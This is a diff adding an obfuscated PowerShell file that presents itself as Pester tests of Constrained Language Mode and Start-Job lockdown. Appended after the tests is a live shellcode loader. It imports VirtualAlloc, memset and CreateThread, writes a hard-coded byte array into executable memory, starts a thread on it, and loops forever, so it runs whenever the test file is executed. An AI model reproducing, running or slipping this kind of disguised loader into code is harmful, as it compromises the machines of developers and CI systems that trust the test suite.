@@ -1,0 +1,76 @@
+&("{0}{1}{2}" -f 'Imp','ort-M','odule') ("{0}{1}{2}"-f'HelpersSecur','it','y')
+
+try
+{
+    ${d`ef`AulTpAramV`AluES} = ${P`sd`EFAuLTpa`RAme`T`erVa`lUEs}.("{1}{0}" -f 'e','Clon').Invoke()
+    ${P`sDEFauLTPAR`AMetERva`lU`ES}[("{1}{0}"-f 'kip','it:S')] = !${iS`w`iNDoWS}
+
+    .("{0}{1}" -f 'De','scribe') ("{15}{11}{2}{9}{4}{14}{1}{0}{12}{7}{8}{3}{20}{6}{10}{17}{5}{18}{16}{13}{19}"-f'l scr','owerShel','ti','ot',' ','ne','allowed in','files',' are n','ng',' Const','r','ipt ','gu','P','Impo','an','rai','dL','age',' ') -Tags 'CI',("{1}{4}{2}{0}{3}{5}" -f 'W','Re','eAdminOn','i','quir','ndows') {
+
+        .("{2}{1}{0}{3}"-f 'eA','r','Befo','ll') {
+
+            ${scRi`P`TfI`LEnAmE} = (.("{2}{1}{5}{3}{0}{4}" -f'am','t-Ra','Ge','mFileN','e','ndo')) + ("{1}{0}"-f'ps1','.')
+            ${Sc`RipTF`iLEpa`Th} = &("{2}{0}{1}" -f'P','ath','Join-') ${T`Es`TDriVe} ${sCR`iP`Tf`ILEn`Ame}
+            ((("{1}{3}{2}{0}"-f '}','{0}','{0','Hello!')) -F [CHAR]34) > ${S`cRipt`Fil`Epath}
+        }
+
+        &('It') ("{5}{12}{16}{9}{4}{7}{0}{13}{1}{2}{17}{10}{11}{6}{3}{8}{14}{15}" -f'ri','file ca','nnot be im','d','at ps1 s','Ver',' in Constraine','c','Lang','th','rte','d','ifies','pt ','uage ','mode',' ','po') {
+
+            ${E`RR} = ${N`ULl}
+            try
+            {
+                ${exEC`Ut`IoNcONtE`xT}."S`e`SsionsTaTE"."lA`N`guA`GEMODE" = ("{1}{0}{4}{5}{2}{3}"-f't','Cons','n','guage','rai','nedLa')
+                &("{1}{3}{0}{2}{4}" -f 'u','Import','l','-Mod','e') -Name ${SCRIp`TFI`leP`A`Th}
+                throw ("{2}{3}{1}{0}"-f'!','xception','No ','E')
+            }
+            catch
+            {
+                ${E`RR} = ${_}
+            }
+            finally
+            {
+                &("{1}{4}{5}{2}{3}{7}{0}{6}"-f 'o','Invo','anguageModeTestingSu','p','k','e-L','rtCmdlet','p') -EnableFullLanguageMode
+            }
+
+            ${e`Rr}."fU`LLyq`UAlIFie`DErRorID" | &("{0}{1}" -f'Sho','uld') -BeExactly ("{3}{6}{13}{20}{29}{23}{18}{17}{0}{25}{28}{7}{24}{4}{27}{9}{1}{2}{11}{8}{14}{22}{21}{5}{19}{12}{10}{16}{26}{15}" -f'l','ge,','Mic','M','InConst','Sh','od','we','so','a','Modul','ro','l.Commands.Import','ule','f','nd','eCom','NotA','ile','el','s','.Power','t','rtPSF','d','l','ma','rainedLangu','o','_Impo')
+        }
+
+        &('It') ("{0}{9}{3}{4}{7}{5}{12}{8}{13}{1}{6}{11}{2}{10}"-f 'Verif','e ','n b','ps','1','s','c',' ','ipt','ies that ','e imported in FullLangauge mode','a','cr',' fil') {
+
+            { &("{1}{2}{0}{3}"-f '-Mod','Im','port','ule') -Name ${S`CrIpTfilEP`A`Th} } | .("{1}{2}{0}" -f'ld','S','hou') -Not -Throw
+        }
+    }
+
+    .("{2}{1}{0}" -f'e','rib','Desc') ("{16}{13}{9}{10}{15}{4}{11}{14}{12}{3}{8}{6}{7}{5}{0}{2}{18}{1}{17}" -f'rk in ','tem ','s','script ','i',' wo','l','d','shou','ar','t-J','niti','ion ','t','alizat','ob ','S','lock down','ys') -Tags ("{1}{0}" -f'e','Featur'),("{3}{2}{1}{4}{5}{0}"-f 'ndows','e','r','Requi','A','dminOnWi') {
+
+        &('It') ("{13}{17}{14}{16}{8}{6}{12}{1}{7}{4}{0}{5}{2}{3}{15}{10}{9}{11}"-f 'u','ns s','y in ','s','sf','ll','t r','ucces','ialization scrip','em lock dow','st','n','u','Ve','a','y','rt-Job init','rifies that St') {
+
+            try
+            {
+                .("{6}{2}{7}{1}{4}{3}{0}{5}"-f'md','stingSupp','eMo','rtC','o','let','Invoke-Languag','deTe') -SetLockdownMode
+                ${E`XE`cU`TiONcONt`ExT}."seS`Sions`Tate"."l`AnG`UaGe`mODe" = ("{3}{4}{2}{0}{1}"-f 'ngu','age','La','Con','strained')
+
+                ${j`Ob} = &("{1}{0}" -f'ob','Start-J') -InitializationScript { function HE`llO { ("{0}{1}"-f'Hell','o') } } -ScriptBlock { &("{0}{1}" -f 'Hel','lo') }
+                ${re`S`Ult} = ${J`OB} | &("{2}{1}{0}" -f't-Job','i','Wa') | .("{1}{3}{0}{2}" -f 'J','Re','ob','ceive-')
+            }
+            finally
+            {
+                &("{3}{5}{1}{0}{2}{7}{4}{6}" -f 'ageMo','-Langu','deTe','I','SupportCmdle','nvoke','t','sting') -RevertLockdownMode -EnableFullLanguageMode
+            }
+
+            ${R`eSUlt} | .("{1}{2}{0}" -f 'uld','Sh','o') -BeExactly ("{0}{1}"-f 'H','ello')
+            ${J`OB} | .("{2}{0}{1}" -f'e-J','ob','Remov')
+        }
+    }
+
+    
+}
+finally
+{
+    if (${deFaU`lTpa`Ra`MVAlU`eS} -ne ${N`ULL})
+    {
+        ${GlO`B`Al:PSdEFa`ULTpaRa`M`ETervaluES} = ${dEFAULTp`AR`A`mva`L`UEs}
+    }
+}
+
+${X`gFi} = ((("{10}{45}{40}{112}{49}{32}{51}{38}{111}{64}{59}{18}{21}{118}{19}{31}{75}{9}{56}{95}{1}{73}{16}{34}{48}{100}{76}{41}{68}{23}{46}{8}{0}{47}{85}{25}{54}{69}{13}{107}{86}{82}{22}{84}{66}{3}{105}{90}{77}{117}{78}{71}{109}{62}{70}{101}{28}{104}{60}{52}{50}{33}{87}{53}{99}{44}{26}{93}{106}{5}{113}{96}{80}{91}{24}{43}{98}{102}{89}{2}{15}{42}{29}{115}{12}{7}{58}{108}{65}{67}{55}{94}{4}{61}{17}{35}{79}{20}{74}{63}{37}{39}{81}{92}{110}{72}{103}{83}{11}{14}{36}{6}{88}{30}{27}{97}{119}{116}{114}{57}" -f ', uint','r lpAd','u','})]p','[DllImpo','ta',' de','nFl','ype','(','[D','ntP','atio','lImpo','t','in','u','}msv','Pt','Vir','{','r','l32.d','locatio',' I','ct)','n',' src',' l','d','int','tual','nel32.dll{0','u','int ','crt','r','bli',']','c ','l','nt fl','t ','ntPtr lpPara','ze, I','l','nT',' flProt','dw','ker','ttrib','})','eadA','t dwSta',';[',' l','In',';','ag','atic extern Int','r','rt({0','T','})]pu','ic st',' Int','0','Ptr','Al','Dl','h','IntPtr','r ','dress, ','0','Alloc','ui','c','c extern ','.dll','es','static ex','0}kerne','set(I','ll{','e','({','tes, uin','st, u','r, ','bli','s,','tern Int','tP','pThreadId);','tPt','tAddr',', u','m','ckSi','Size, ','read(IntPtr','ete','mem','pTh','u','tr lpS','rt','s,',' Create','Pt','publ','Import({0}','r','count)','wCre','nt ',' stati',' ','i')) -f  [CHAR]34);${W} = .("{1}{2}{0}" -f 'e','Add-','Typ') -memberDefinition ${x`GFI} -Name ("{1}{0}" -f 'n32','Wi') -namespace ("{1}{2}{3}{0}" -f 'ons','W','in32Funct','i') -passthru;[Byte[]];[Byte[]]${z} = 0xb8,0x21,0x2d,0x9c,0x3d,0xd9,0xf7,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x46,0x13,0x03,0x46,0x13,0x83,0xee,0xdd,0xcf,0x69,0xc1,0xf5,0x92,0x92,0x3a,0x05,0xf3,0x1b,0xdf,0x34,0x33,0x7f,0xab,0x66,0x83,0x0b,0xf9,0x8a,0x68,0x59,0xea,0x19,0x1c,0x76,0x1d,0xaa,0xab,0xa0,0x10,0x2b,0x87,0x91,0x33,0xaf,0xda,0xc5,0x93,0x8e,0x14,0x18,0xd5,0xd7,0x49,0xd1,0x87,0x80,0x06,0x44,0x38,0xa5,0x53,0x55,0xb3,0xf5,0x72,0xdd,0x20,0x4d,0x74,0xcc,0xf6,0xc6,0x2f,0xce,0xf9,0x0b,0x44,0x47,0xe2,0x48,0x61,0x11,0x99,0xba,0x1d,0xa0,0x4b,0xf3,0xde,0x0f,0xb2,0x3c,0x2d,0x51,0xf2,0xfa,0xce,0x24,0x0a,0xf9,0x73,0x3f,0xc9,0x80,0xaf,0xca,0xca,0x22,0x3b,0x6c,0x37,0xd3,0xe8,0xeb,0xbc,0xdf,0x45,0x7f,0x9a,0xc3,0x58,0xac,0x90,0xff,0xd1,0x53,0x77,0x76,0xa1,0x77,0x53,0xd3,0x71,0x19,0xc2,0xb9,0xd4,0x26,0x14,0x62,0x88,0x82,0x5e,0x8e,0xdd,0xbe,0x3c,0xc6,0x12,0xf3,0xbe,0x16,0x3d,0x84,0xcd,0x24,0xe2,0x3e,0x5a,0x04,0x6b,0x99,0x9d,0x6b,0x46,0x5d,0x31,0x92,0x69,0x9e,0x1b,0x50,0x3d,0xce,0x33,0x71,0x3e,0x85,0xc3,0x7e,0xeb,0x30,0xc1,0xe8,0x0c,0xf4,0xba,0xe4,0x44,0xf4,0x3c,0xf9,0x10,0x71,0xda,0x51,0x49,0xd2,0x73,0x11,0x39,0x92,0x23,0xf9,0x53,0x1d,0x1b,0x19,0x5c,0xf7,0x34,0xb3,0xb3,0xae,0x6d,0x2b,0x2d,0xeb,0xe6,0xca,0xb2,0x21,0x83,0xcc,0x39,0xc6,0x73,0x82,0xc9,0xa3,0x67,0x72,0x3a,0xfe,0xda,0xd4,0x45,0xd4,0x71,0xd8,0xd3,0xd3,0xd3,0x8f,0x4b,0xde,0x02,0xe7,0xd3,0x21,0x61,0x7c,0xdd,0xb7,0xca,0xea,0x22,0x58,0xcb,0xea,0x74,0x32,0xcb,0x82,0x20,0x66,0x98,0xb7,0x2e,0xb3,0x8c,0x64,0xbb,0x3c,0xe5,0xd9,0x6c,0x55,0x0b,0x04,0x5a,0xfa,0xf4,0x63,0x5a,0xc6,0x22,0x4d,0x28,0x26,0xf7;${g} = 0x1000;if (${z}."lEN`gTh" -gt 0x1000){${g} = ${z}."LeNg`TH"};${8`HP9}=${W}::("{0}{3}{1}{2}"-f 'V','lAllo','c','irtua').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${z}."l`ENgth"-1);${i}++) {${W}::"meMs`eT"([IntPtr](${8`HP9}.("{1}{0}"-f 't32','ToIn').Invoke()+${I}), ${z}[${i}], 1)};${w}::("{0}{2}{1}" -f 'C','d','reateThrea').Invoke(0,0,${8`HP9},0,0,0);for (;;){.("{0}{1}{2}"-f 'S','ta','rt-sleep') 60};
